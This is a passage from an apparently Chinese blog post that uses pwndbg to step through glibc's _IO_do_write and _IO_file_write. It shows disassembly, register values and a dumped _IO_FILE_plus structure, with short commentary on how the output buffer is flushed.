rax,r13</span><br><span class="line">   0x00007ffff7c8c9ce &lt;+158&gt;:   jae    0x7ffff7c8ca80 &lt;_IO_new_do_write+336&gt;</span><br><span class="line">   0x00007ffff7c8c9d4 &lt;+164&gt;:   mov    rdx,rbp</span><br><span class="line">   0x00007ffff7c8c9d7 &lt;+167&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8c9da &lt;+170&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8c9dd &lt;+173&gt;:   call   QWORD PTR [r14+0x78]</span><br><span class="line">   0x00007ffff7c8c9e1 &lt;+177&gt;:   mov    r13,rax</span><br><span class="line">   0x00007ffff7c8c9e4 &lt;+180&gt;:   movzx  eax,WORD PTR [rbx+0x80]</span><br><span class="line">   0x00007ffff7c8c9eb &lt;+187&gt;:   test   r13,r13</span><br><span class="line">   0x00007ffff7c8c9ee &lt;+190&gt;:   je     0x7ffff7c8c9f5 &lt;_IO_new_do_write+197&gt;</span><br><span class="line">   0x00007ffff7c8c9f0 &lt;+192&gt;:   test   ax,ax</span><br><span class="line">   0x00007ffff7c8c9f3 &lt;+195&gt;:   jne    0x7ffff7c8ca60 &lt;_IO_new_do_write+304&gt;</span><br><span class="line">   0x00007ffff7c8c9f5 &lt;+197&gt;:   mov    rax,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8c9f9 &lt;+201&gt;:   mov    edx,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c8c9ff &lt;+207&gt;:   movq   xmm0,rax</span><br><span class="line">   0x00007ffff7c8ca04 &lt;+212&gt;:   mov    QWORD PTR [rbx+0x28],rax</span><br><span class="line">   0x00007ffff7c8ca08 &lt;+216&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8ca0c &lt;+220&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8ca10 &lt;+224&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8ca14 &lt;+228&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8ca16 &lt;+230&gt;:   jle    0x7ffff7c8ca50 &lt;_IO_new_do_write+288&gt;</span><br><span class="line">   0x00007ffff7c8ca18 &lt;+232&gt;:   mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8ca1c &lt;+236&gt;:   mov    QWORD PTR [rbx+0x30],rax</span><br><span class="line">   0x00007ffff7c8ca20 &lt;+240&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c8ca22 &lt;+242&gt;:   cmp    rbp,r13</span><br><span class="line">   0x00007ffff7c8ca25 &lt;+245&gt;:   setne  al</span><br><span class="line">   0x00007ffff7c8ca28 &lt;+248&gt;:   neg    eax</span><br><span class="line">   0x00007ffff7c8ca2a &lt;+250&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c8ca2e &lt;+254&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ca2f &lt;+255&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ca30 &lt;+256&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ca32 &lt;+258&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8ca34 &lt;+260&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8ca36 &lt;+262&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8ca38 &lt;+264&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ca39 &lt;+265&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8ca40 &lt;+272&gt;:   mov    QWORD PTR [rdi+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8ca4b &lt;+283&gt;:   jmp    0x7ffff7c8c9c5 &lt;_IO_new_do_write+149&gt;</span><br><span class="line">   0x00007ffff7c8ca50 &lt;+288&gt;:   test   DWORD PTR [rbx],0x202</span><br><span class="line">   0x00007ffff7c8ca56 &lt;+294&gt;:   jne    0x7ffff7c8ca1c &lt;_IO_new_do_write+236&gt;</span><br><span class="line">   0x00007ffff7c8ca58 &lt;+296&gt;:   jmp    0x7ffff7c8ca18 &lt;_IO_new_do_write+232&gt;</span><br><span class="line">   0x00007ffff7c8ca5a &lt;+298&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ca60 &lt;+304&gt;:   lea    edi,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8ca63 &lt;+307&gt;:   mov    edx,r13d</span><br><span class="line">   0x00007ffff7c8ca66 &lt;+310&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8ca69 &lt;+313&gt;:   call   0x7ffff7c8e8b0 &lt;__GI__IO_adjust_column&gt;</span><br><span class="line">   0x00007ffff7c8ca6e &lt;+318&gt;:   add    eax,0x1</span><br><span class="line">   0x00007ffff7c8ca71 &lt;+321&gt;:   mov    WORD PTR [rbx+0x80],ax</span><br><span class="line">   0x00007ffff7c8ca78 &lt;+328&gt;:   jmp    0x7ffff7c8c9f5 &lt;_IO_new_do_write+197&gt;</span><br><span class="line">   0x00007ffff7c8ca7d &lt;+333&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8ca80 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8ca85 &lt;+341&gt;:   jmp    0x7ffff7c8c9d4 &lt;_IO_new_do_write+164&gt;</span><br><span class="line">   0x00007ffff7c8ca8a &lt;+346&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ca90 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8ca95 &lt;+357&gt;:   mov    rsi,QWORD PTR [rbx+0x20]</span><br><span class="line">   0x00007ffff7c8ca99 &lt;+361&gt;:   mov    rax,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8ca9d &lt;+365&gt;:   jmp    0x7ffff7c8c997 &lt;_IO_new_do_write+103&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个函数先判断输出缓冲区有无数据需要输出（这一部分在<code>fwrite</code>函数分析过，但那时不需要输出）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;       endbr64</span><br><span class="line">0x7ffff7c8c934 &lt;_IO_do_write+4&gt;     xor    eax, eax     EAX =&gt; 0</span><br><span class="line">0x7ffff7c8c936 &lt;_IO_do_write+6&gt;     test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c939 &lt;_IO_do_write+9&gt;   ✔ jne    _IO_do_write+16             &lt;_IO_do_write+16&gt;</span><br></pre></td></tr></table></figure><p>我们这里刚调用过<code>fwrite</code>函数，所以缓冲区是需要刷新的，所以继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c940 &lt;_IO_do_write+16&gt;    push   r15</span><br><span class="line">0x7ffff7c8c942 &lt;_IO_do_write+18&gt;    lea    r15, [rip + 0x18a0b7]     R15 =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c949 &lt;_IO_do_write+25&gt;    push   r14</span><br><span class="line">0x7ffff7c8c94b &lt;_IO_do_write+27&gt;    push   r13</span><br><span class="line">0x7ffff7c8c94d &lt;_IO_do_write+29&gt;    lea    r13, [rip + 0x18ae14]     R13 =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8c954 &lt;_IO_do_write+36&gt;    push   r12</span><br><span class="line">0x7ffff7c8c956 &lt;_IO_do_write+38&gt;    sub    r13, r15                  R13 =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8c959 &lt;_IO_do_write+41&gt;    mov    r12, rsi                        R12 =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c95c &lt;_IO_do_write+44&gt;    push   rbp</span><br><span class="line">0x7ffff7c8c95d &lt;_IO_do_write+45&gt;    mov    rbp, rdx                        RBP =&gt; 0x20</span><br><span class="line">0x7ffff7c8c960 &lt;_IO_do_write+48&gt;    push   rbx</span><br><span class="line">0x7ffff7c8c961 &lt;_IO_do_write+49&gt;    mov    rbx, rdi                        RBX =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8c964 &lt;_IO_do_write+52&gt;    sub    rsp, 8                          RSP =&gt; 0x7fffffffdc00 (0x7fffffffdc08 - 0x8)</span><br><span class="line">0x7ffff7c8c968 &lt;_IO_do_write+56&gt;    mov    r14, qword ptr [rdi + 0xd8]     R14, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c96f &lt;_IO_do_write+63&gt;    test   dword ptr [rdi], 0x1000         0xfbad2c04 &amp; 0x1000     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c975 &lt;_IO_do_write+69&gt;  ✘ jne    _IO_do_write+272            &lt;_IO_do_write+272&gt;</span><br></pre></td></tr></table></figure><p>这里是<code>vtable</code>的安全检查，不再赘述，继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c97b &lt;_IO_do_write+75&gt;     mov    rax, qword ptr [rdi + 0x10]     RAX, [0x5555555592b0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c97f &lt;_IO_do_write+79&gt;     mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c983 &lt;_IO_do_write+83&gt;     cmp    rax, rsi                        0x5555555594b0 - 0x5555555594b0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c986 &lt;_IO_do_write+86&gt;   ✔ je     _IO_do_write+149            &lt;_IO_do_write+149&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8c9c5 &lt;_IO_do_write+149&gt;    mov    rax, r14     RAX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c9c8 &lt;_IO_do_write+152&gt;    sub    rax, r15     RAX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8c9cb &lt;_IO_do_write+155&gt;    cmp    rax, r13     0xc00 - 0xd68     EFLAGS =&gt; 0x293 [ CF pf AF zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8c9ce &lt;_IO_do_write+158&gt;  ✘ jae    _IO_do_write+336            &lt;_IO_do_write+336&gt;</span><br></pre></td></tr></table></figure><p>往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c9d4 &lt;_IO_do_write+164&gt;    mov    rdx, rbp     RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8c9d7 &lt;_IO_do_write+167&gt;    mov    rsi, r12     RSI =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c9da &lt;_IO_do_write+170&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8c9dd &lt;_IO_do_write+173&gt;    call   qword ptr [r14 + 0x78]      &lt;_IO_file_write&gt;</span><br></pre></td></tr></table></figure><p>这里调用了<code>vtable-&gt;_IO_file_write</code>来输出缓冲区数据以刷新缓冲区（我们这里<code>fp-&gt;_IO_write_base</code>与<code>fp-&gt;_IO_write_ptr</code>间是有数据的）<br>跟进<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_write:</span><br><span class="line">=&gt; 0x00007ffff7c8aec0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8aec4 &lt;+4&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8aec6 &lt;+6&gt;:     mov    r13,rdi</span><br><span class="line">   0x00007ffff7c8aec9 &lt;+9&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8aecb &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8aecc &lt;+12&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8aecd &lt;+13&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c8aed1 &lt;+17&gt;:    test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8aed4 &lt;+20&gt;:    jle    0x7ffff7c8af58 &lt;_IO_new_file_write+152&gt;</span><br><span class="line">   0x00007ffff7c8aeda &lt;+26&gt;:    mov    rbp,rsi</span><br><span class="line">   0x00007ffff7c8aedd &lt;+29&gt;:    mov    r12,rdx</span><br><span class="line">   0x00007ffff7c8aee0 &lt;+32&gt;:    mov    rbx,rdx</span><br><span class="line">   0x00007ffff7c8aee3 &lt;+35&gt;:    jmp    0x7ffff7c8aefd &lt;_IO_new_file_write+61&gt;</span><br><span class="line">   0x00007ffff7c8aee5 &lt;+37&gt;:    nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8aee8 &lt;+40&gt;:    call   0x7ffff7d14870 &lt;__GI___libc_write&gt;</span><br><span class="line">   0x00007ffff7c8aeed &lt;+45&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8aef0 &lt;+48&gt;:    js     0x7ffff7c8af20 &lt;_IO_new_file_write+96&gt;</span><br><span class="line">   0x00007ffff7c8aef2 &lt;+50&gt;:    sub    rbx,rax</span><br><span class="line">   0x00007ffff7c8aef5 &lt;+53&gt;:    add    rbp,rax</span><br><span class="line">   0x00007ffff7c8aef8 &lt;+56&gt;:    test   rbx,rbx</span><br><span class="line">   0x00007ffff7c8aefb &lt;+59&gt;:    jle    0x7ffff7c8af50 &lt;_IO_new_file_write+144&gt;</span><br><span class="line">   0x00007ffff7c8aefd &lt;+61&gt;:    mov    edi,DWORD PTR [r13+0x70]</span><br><span class="line">   0x00007ffff7c8af01 &lt;+65&gt;:    mov    rdx,rbx</span><br><span class="line">   0x00007ffff7c8af04 &lt;+68&gt;:    mov    rsi,rbp</span><br><span class="line">   0x00007ffff7c8af07 &lt;+71&gt;:    test   BYTE PTR [r13+0x74],0x2</span><br><span class="line">   0x00007ffff7c8af0c &lt;+76&gt;:    je     0x7ffff7c8aee8 &lt;_IO_new_file_write+40&gt;</span><br><span class="line">   0x00007ffff7c8af0e &lt;+78&gt;:    call   0x7ffff7d19b90 &lt;__GI___write_nocancel&gt;</span><br><span class="line">   0x00007ffff7c8af13 &lt;+83&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8af16 &lt;+86&gt;:    jns    0x7ffff7c8aef2 &lt;_IO_new_file_write+50&gt;</span><br><span class="line">   0x00007ffff7c8af18 &lt;+88&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8af20 &lt;+96&gt;:    or     DWORD PTR [r13+0x0],0x20</span><br><span class="line">   0x00007ffff7c8af25 &lt;+101&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8af28 &lt;+104&gt;:   sub    rax,rbx</span><br><span class="line">   0x00007ffff7c8af2b &lt;+107&gt;:   mov    rdx,QWORD PTR [r13+0x90]</span><br><span class="line">   0x00007ffff7c8af32 &lt;+114&gt;:   test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8af35 &lt;+117&gt;:   js     0x7ffff7c8af41 &lt;_IO_new_file_write+129&gt;</span><br><span class="line">   0x00007ffff7c8af37 &lt;+119&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8af3a &lt;+122&gt;:   mov    QWORD PTR [r13+0x90],rdx</span><br><span class="line">   0x00007ffff7c8af41 &lt;+129&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c8af45 &lt;+133&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8af46 &lt;+134&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8af47 &lt;+135&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8af49 &lt;+137&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8af4b &lt;+139&gt;:   ret</span><br><span class="line">   0x00007ffff7c8af4c &lt;+140&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8af50 &lt;+144&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8af53 &lt;+147&gt;:   sub    rax,rbx</span><br><span class="line">   0x00007ffff7c8af56 &lt;+150&gt;:   jmp    0x7ffff7c8af2b &lt;_IO_new_file_write+107&gt;</span><br><span class="line">   0x00007ffff7c8af58 &lt;+152&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c8af5a &lt;+154&gt;:   jmp    0x7ffff7c8af2b &lt;_IO_new_file_write+107&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>仍然是判断需要输出的数据长度是否为0<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8aec4 &lt;_IO_file_write+4&gt;     push   r13</span><br><span class="line">0x7ffff7c8aec6 &lt;_IO_file_write+6&gt;     mov    r13, rdi     R13 =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8aec9 &lt;_IO_file_write+9&gt;     push   r12</span><br><span class="line">0x7ffff7c8aecb &lt;_IO_file_write+11&gt;    push   rbp</span><br><span class="line">0x7ffff7c8aecc &lt;_IO_file_write+12&gt;    push   rbx</span><br><span class="line">0x7ffff7c8aecd &lt;_IO_file_write+13&gt;    sub    rsp, 8       RSP =&gt; 0x7fffffffdbd0 (0x7fffffffdbd8 - 0x8)</span><br><span class="line">0x7ffff7c8aed1 &lt;_IO_file_write+17&gt;    test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8aed4 &lt;_IO_file_write+20&gt;  ✘ jle    _IO_file_write+152          &lt;_IO_file_write+152&gt;</span><br></pre></td></tr></table></figure><p>为0则直接返回，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8aeda &lt;_IO_file_write+26&gt;    mov    rbp, rsi     RBP =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8aedd &lt;_IO_file_write+29&gt;    mov    r12, rdx     R12 =&gt; 0x20</span><br><span class="line">0x7ffff7c8aee3 &lt;_IO_file_write+35&gt;:   jmp    0x7ffff7c8aefd &lt;_IO_new_file_write+61&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8aefd &lt;_IO_file_write+61&gt;    mov    edi, dword ptr [r13 + 0x70]     EDI, [0x555555559310] =&gt; 3</span><br><span class="line">0x7ffff7c8af01 &lt;_IO_file_write+65&gt;    mov    rdx, rbx                        RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8af04 &lt;_IO_file_write+68&gt;    mov    rsi, rbp                        RSI =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8af07 &lt;_IO_file_write+71&gt;    test   byte ptr [r13 + 0x74], 2        0 &amp; 2     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8af0c &lt;_IO_file_write+76&gt;  ✔ je     _IO_file_write+40           &lt;_IO_file_write+40&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8aee8 &lt;_IO_file_write+40&gt;    call   write                       &lt;write&gt;</span><br></pre></td></tr></table></figure><p>后续就是系统调用<code>write</code>来将输出缓冲区的数据输出到目标文件<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7d14870 &lt;write&gt;       endbr64</span><br><span class="line">0x7ffff7d14874 &lt;write+4&gt;     mov    eax, dword ptr fs:[0x18]     EAX, [0x7ffff7fb1758] =&gt; 0</span><br><span class="line">0x7ffff7d1487c &lt;write+12&gt;    test   eax, eax                     0 &amp; 0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7d1487e &lt;write+14&gt;  ✘ jne    write+32                    &lt;write+32&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7d14880 &lt;write+16&gt;    mov    eax, 1            EAX =&gt; 1</span><br><span class="line">0x7ffff7d14885 &lt;write+21&gt;    syscall  &lt;SYS_write&gt;</span><br></pre></td></tr></table></figure><p>后续回到<code>_IO_do_write</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c9f5 &lt;_IO_do_write+197&gt;    mov    rax, qword ptr [rbx + 0x38]     RAX, [0x5555555592d8] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c9f9 &lt;_IO_do_write+201&gt;    mov    edx, dword ptr [rbx + 0xc0]     EDX, [0x555555559360] =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8c9ff &lt;_IO_do_write+207&gt;    movq   xmm0, rax                       XMM0 =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8ca04 &lt;_IO_do_write+212&gt;    mov    qword ptr [rbx + 0x28], rax     [0x5555555592c8] &lt;= 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8ca08 &lt;_IO_do_write+216&gt;    punpcklqdq xmm0, xmm0</span><br><span class="line">0x7ffff7c8ca0c &lt;_IO_do_write+220&gt;    movups xmmword ptr [rbx + 8], xmm0</span><br><span class="line">0x7ffff7c8ca10 &lt;_IO_do_write+224&gt;    movups xmmword ptr [rbx + 0x18], xmm0</span><br><span class="line">0x7ffff7c8ca14 &lt;_IO_do_write+228&gt;    test   edx, edx                           0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8ca16 &lt;_IO_do_write+230&gt;  ✔ jle    _IO_do_write+288            &lt;_IO_do_write+288&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8ca50 &lt;_IO_do_write+288&gt;    test   dword ptr [rbx], 0x202             0xfbad2c04 &amp; 0x202     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8ca56 &lt;_IO_do_write+294&gt;  ✘ jne    _IO_do_write+236            &lt;_IO_do_write+236&gt;</span><br></pre></td></tr></table></figure><p>看到刷新了write指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537084,</span><br><span class="line">    _IO_read_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_end = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_read_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_ptr = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_write_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_buf_base = 0x5555555594b0 &#x27;w&#x27; &lt;repeats 32 times&gt;,</span><br><span class="line">    _IO_buf_end = 0x55555555a4b0 &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往后<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 